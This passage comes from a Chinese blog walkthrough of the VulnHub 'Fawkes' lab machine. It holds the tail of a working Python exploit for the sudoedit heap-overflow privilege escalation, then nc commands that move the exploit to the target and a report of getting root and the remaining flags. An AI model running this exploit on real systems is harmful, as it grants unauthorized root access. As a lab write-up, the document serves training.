&quot;parse_args() -&gt; get_net_ifs()&quot; with very large buffer</span></span><br><span class="line">	<span class="keyword">try</span>:</span><br><span class="line">		<span class="keyword">import</span> ipaddress</span><br><span class="line">	<span class="keyword">except</span>:</span><br><span class="line">		<span class="keyword">return</span> chunk_cnt</span><br><span class="line">	cnt = <span class="number">0</span></span><br><span class="line">	malloc_size = <span class="number">0</span></span><br><span class="line">	proc = subprocess.Popen([<span class="string">&#x27;ip&#x27;</span>, <span class="string">&#x27;addr&#x27;</span>], stdout=subprocess.PIPE, bufsize=<span class="number">1</span>, universal_newlines=<span class="literal">True</span>)</span><br><span class="line">	<span class="keyword">for</span> line <span class="keyword">in</span> proc.stdout:</span><br><span class="line">		line = line.strip()</span><br><span class="line">		<span class="keyword">if</span> <span class="keyword">not</span> line.startswith(<span class="string">&#x27;inet&#x27;</span>):</span><br><span class="line">			<span class="keyword">continue</span></span><br><span class="line">		<span class="keyword">if</span> cnt &lt; <span class="number">2</span>: <span class="comment"># skip first 2 address (lo interface)</span></span><br><span class="line">			cnt += <span class="number">1</span></span><br><span class="line">			<span class="keyword">continue</span>;</span><br><span class="line">		addr = line.split(<span class="string">&#x27; &#x27;</span>, <span class="number">2</span>)[<span class="number">1</span>]</span><br><span class="line">		mask = <span class="built_in">str</span>(ipaddress.ip_network(addr <span class="keyword">if</span> sys.version_info &gt;= (<span class="number">3</span>,<span class="number">0</span>,<span class="number">0</span>) <span class="keyword">else</span> addr.decode(<span class="string">&quot;UTF-8&quot;</span>), <span class="literal">False</span>).netmask)</span><br><span class="line">		malloc_size += addr.index(<span class="string">&#x27;/&#x27;</span>) + <span class="number">1</span> + <span class="built_in">len</span>(mask)</span><br><span class="line">		cnt += <span class="number">1</span></span><br><span class="line">	malloc_size += <span class="built_in">len</span>(<span class="string">&quot;network_addrs=&quot;</span>) + cnt - <span class="number">3</span> + <span class="number">1</span></span><br><span class="line">	chunk_size = (malloc_size + <span class="number">8</span> + <span class="number">15</span>) &amp; <span class="number">0xfffffff0</span></span><br><span class="line">	<span class="keyword">if</span> chunk_size == target_chunk_size: chunk_cnt += <span class="number">1</span></span><br><span class="line">	proc.wait()</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">return</span> chunk_cnt</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">execve</span>(<span class="params">filename, argv, envp</span>):</span><br><span class="line">	libc.execve.argtypes = c_char_p,POINTER(c_char_p),POINTER(c_char_p)</span><br><span class="line">	</span><br><span class="line">	cargv = (c_char_p * <span class="built_in">len</span>(argv))(*argv)</span><br><span class="line">	cenvp = (c_char_p * <span class="built_in">len</span>(envp))(*envp)</span><br><span class="line"></span><br><span class="line">	libc.execve(filename, cargv, cenvp)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">lc_env</span>(<span class="params">cat_id, chunk_len</span>):</span><br><span class="line">	name = <span class="string">b&quot;C.UTF-8@&quot;</span></span><br><span class="line">	name = name.ljust(chunk_len - <span class="number">0x18</span>, <span class="string">b&#x27;Z&#x27;</span>)</span><br><span class="line">	<span class="keyword">return</span> LC_CATS[cat_id]+<span class="string">b&quot;=&quot;</span>+name</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> check_is_vuln(), <span class="string">&quot;target is patched&quot;</span></span><br><span class="line"><span class="keyword">assert</span> check_libc_version(), <span class="string">&quot;glibc is too old. The exploit is relied on glibc tcache feature. Need version &gt;= 2.26&quot;</span></span><br><span class="line"><span class="keyword">assert</span> check_libc_tcache(), <span class="string">&quot;glibc tcache is not found&quot;</span></span><br><span class="line"><span class="keyword">assert</span> check_nscd_condition(), <span class="string">&quot;nscd service is running, exploit is impossible with this method&quot;</span></span><br><span class="line">service_user_idx = get_service_user_idx()</span><br><span class="line"><span class="keyword">assert</span> service_user_idx &lt; <span class="number">9</span>, <span class="string">&#x27;&quot;group&quot; db in nsswitch.conf is too far, idx: %d&#x27;</span> % service_user_idx</span><br><span class="line">create_libx(<span class="string">&quot;X/X1234&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Note: actions[5] can be any value. library and known MUST be NULL</span></span><br><span class="line">FAKE_USER_SERVICE_PART = [ <span class="string">b&quot;\\&quot;</span> ] * <span class="number">0x18</span> + [ <span class="string">b&quot;X/X1234\\&quot;</span> ]</span><br><span class="line"></span><br><span class="line">TARGET_OFFSET_START = <span class="number">0x780</span></span><br><span class="line">FAKE_USER_SERVICE = FAKE_USER_SERVICE_PART*<span class="number">30</span></span><br><span class="line">FAKE_USER_SERVICE[-<span class="number">1</span>] = FAKE_USER_SERVICE[-<span class="number">1</span>][:-<span class="number">1</span>]  <span class="comment"># remove last &#x27;\\&#x27;. stop overwritten</span></span><br><span class="line"></span><br><span class="line">CHUNK_CMND_SIZE = <span class="number">0xf0</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Allow custom extra_chunk_cnt incase unexpected allocation</span></span><br><span class="line"><span class="comment"># Note: this step should be no need when CHUNK_CMND_SIZE is 0xf0</span></span><br><span class="line">extra_chunk_cnt = get_extra_chunk_count(CHUNK_CMND_SIZE) <span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) &lt; <span class="number">2</span> <span class="keyword">else</span> <span class="built_in">int</span>(sys.argv[<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line">argv = [ <span class="string">b&quot;sudoedit&quot;</span>, <span class="string">b&quot;-A&quot;</span>, <span class="string">b&quot;-s&quot;</span>, <span class="string">b&quot;A&quot;</span>*(CHUNK_CMND_SIZE-<span class="number">0x10</span>)+<span class="string">b&quot;\\&quot;</span>, <span class="literal">None</span> ]</span><br><span class="line">env = [ <span class="string">b&quot;Z&quot;</span>*(TARGET_OFFSET_START + <span class="number">0xf</span> - <span class="number">8</span> - <span class="number">1</span>) + <span class="string">b&quot;\\&quot;</span> ] + FAKE_USER_SERVICE</span><br><span class="line"><span class="comment"># first 2 chunks are fixed. chunk40 (target service_user) is overwritten from overflown cmnd (in get_cmnd)</span></span><br><span class="line">env.extend([ lc_env(<span class="number">0</span>, <span class="number">0x40</span>)+<span class="string">b&quot;;A=&quot;</span>, lc_env(<span class="number">1</span>, CHUNK_CMND_SIZE) ])</span><br><span class="line"></span><br><span class="line"><span class="comment"># add free chunks that created before target service_user</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>, service_user_idx+<span class="number">2</span>):</span><br><span class="line">	<span class="comment"># skip LC_ALL (6)</span></span><br><span class="line">	env.append(lc_env(i <span class="keyword">if</span> i &lt; <span class="number">6</span> <span class="keyword">else</span> i+<span class="number">1</span>, <span class="number">0x40</span>))</span><br><span class="line"><span class="keyword">if</span> service_user_idx == <span class="number">0</span>:</span><br><span class="line">	env.append(lc_env(<span class="number">2</span>, <span class="number">0x20</span>)) <span class="comment"># for filling hole</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">11</span>, <span class="number">11</span>-extra_chunk_cnt, -<span class="number">1</span>):</span><br><span class="line">	env.append(lc_env(i, CHUNK_CMND_SIZE))</span><br><span class="line"></span><br><span class="line">env.append(lc_env(<span class="number">12</span>, <span class="number">0x90</span>)) <span class="comment"># for filling holes from freed file buffer</span></span><br><span class="line">env.append(<span class="string">b&quot;TZ=:&quot;</span>)  <span class="comment"># shortcut tzset function</span></span><br><span class="line"><span class="comment"># don&#x27;t put &quot;SUDO_ASKPASS&quot; environment. sudo will fail without logging if no segfault</span></span><br><span class="line">env.append(<span class="literal">None</span>)</span><br><span class="line"></span><br><span class="line">execve(SUDO_PATH, argv, env)</span><br></pre></td></tr></table></figure>
+
+<p>将修改后的exp.py利用nc传输到目标靶机内</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -nvlp 4444 &gt; exp.py</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc 192.168.1.101 4444 &lt; exploit_nss.py -w 1</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/14/1657780176472-335a6e92-80e3-4a0c-904a-2f6efc0c9235.png" alt="Snipaste_2022-07-14_14-25-01.png"></p>
+<p>执行exp成功提权为root 并发现第二个flag</p>
+<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/14/1657780176496-6f84835e-2a20-4236-af70-22b573b685fe.png" alt="Snipaste_2022-07-14_14-27-54.png"></p>
+<p>切换到root目录下 发现第三个flag</p>
+<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/14/1657780176637-be6fd5c7-5de9-4617-877e-ca6f7f07caee.png" alt="Snipaste_2022-07-14_14-28-17.png"></p>
+
+  </div>
+</article>
+
+
+    <div class="blog-post-comments">
+        <div id="utterances_thread">
+            <noscript>加载评论需要在浏览器启用 JavaScript 脚本支持。</noscript>
+        </div>
+    </div>
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">首页</a></li>
+        
+          <li><a href="/about/">关于</a></li>
+        
+          <li><a href="/archives/">归档</a></li>
+        
+          <li><a href="/search/">搜索</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%BB%E6%9C%BA%E5%8F%91%E7%8E%B0"><span class="toc-number">1.</span> <span class="toc-text">主机发现</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F"><span class="toc-number">2.</span> <span class="toc-text">端口扫描</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9C%8D%E5%8A%A1%E6%8E%A2%E6%B5%8B"><span class="toc-number">3.</span> <span class="toc-text">服务探测</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#21%E7%AB%AF%E5%8F%A3"><span class="toc-number">3.1.</span> <span class="toc-text">21端口</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#22%E5%92%8C2222%E7%AB%AF%E5%8F%A3"><span class="toc-number">3.2.</span> <span class="toc-text">22和2222端口</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%AE%BF%E9%97%AE80%E7%AB%AF%E5%8F%A3"><span class="toc-number">3.3.</span> <span class="toc-text">访问80端口</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%AE%BF%E9%97%AE9898%E7%AB%AF%E5%8F%A3"><span class="toc-number">3.4.</span> <span class="toc-text">访问9898端口</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ftp%E5%8C%BF%E5%90%8D%E7%99%BB%E5%BD%95"><span class="toc-number">4.</span> <span class="toc-text">ftp匿名登录</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%A8%8B%E5%BA%8F%E8%B0%83%E8%AF%95%E5%88%86%E6%9E%90"><span class="toc-number">5.</span> <span class="toc-text">程序调试分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E"><span class="toc-number">6.</span> <span class="toc-text">缓冲区溢出漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E9%AA%8C%E8%AF%81"><span class="toc-number">6.1.</span> <span class="toc-text">漏洞验证</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-number">6.2.</span> <span class="toc-text">漏洞利用</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ftp%E6%98%8E%E6%96%87%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90"><span class="toc-number">7.</span> <span class="toc-text">ftp明文流量分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8F%90%E6%9D%83"><span class="toc-number">8.</span> <span class="toc-text">提权</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#MSF"><span class="toc-number">8.1.</span> <span class="toc-text">MSF</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BF%AE%E6%94%B9exp"><span class="toc-number">8.2.</span> <span class="toc-text">修改exp</span></a></li></ol></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://byesec.com/posts/66759de7.html"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://byesec.com/posts/66759de7.html&text=VulnHub-12-Fawkes"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://byesec.com/posts/66759de7.html&title=VulnHub-12-Fawkes"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://byesec.com/posts/66759de7.html&is_video=false&description=VulnHub-12-Fawkes"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=VulnHub-12-Fawkes&body=Check out this article: http://byesec.com/posts/66759de7.html"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://byesec.com/posts/66759de7.html&title=VulnHub-12-Fawkes"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://byesec.com/posts/66759de7.html&title=VulnHub-12-Fawkes"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://byesec.com/posts/66759de7.html&title=VulnHub-12-Fawkes"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://byesec.com/posts/66759de7.html&title=VulnHub-12-Fawkes"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://byesec.com/posts/66759de7.html&name=VulnHub-12-Fawkes&description=&lt;blockquote&gt;
+&lt;p&gt;靶机：&lt;a href=&#34;https://download.vulnhub.com/harrypotter/Fawkes.ova&#34;&gt;https://download.vulnhub.com/harrypotter/Fawkes.ova&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;难度：高&lt;/p&gt;
+&lt;p&gt;目标：取得 2 root 权限 + 3 Flag&lt;/p&gt;
+&lt;p&gt;备注：导入靶机时保留原始MAC地址不变（包含所有网卡的MAC地址）&lt;/p&gt;
+&lt;/blockquote&gt;"><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://byesec.com/posts/66759de7.html&t=VulnHub-12-Fawkes"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> 目录</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2021-2024
+    patrik
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">首页</a></li><!--
+     --><!--
+       --><li><a href="/about/">关于</a></li><!--
+     --><!--
+       --><li><a href="/archives/">归档</a></li><!--
+     --><!--
+       --><li><a href="/search/">搜索</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板！\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "复制成功！");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+    <script type="text/javascript">
+      var utterances_repo = 'byesec/blog_utteranc';
+      var utterances_issue_term = 'pathname';
+      var utterances_label = 'Comment';
+      var utterances_theme = 'github-dark';
+
+      (function(){
+          var script = document.createElement('script');
+
+          script.src = 'https://utteranc.es/client.js';
+          script.setAttribute('repo', utterances_repo);
+          script.setAttribute('issue-term', 'pathname');
+          script.setAttribute('label', utterances_label);
+          script.setAttribute('theme', utterances_theme);
+          script.setAttribute('crossorigin', 'anonymous');
+          script.async = true;
+          (document.getElementById('utterances_thread')).appendChild(script);
+      }());
+  </script>
+
+</body>
+</html>
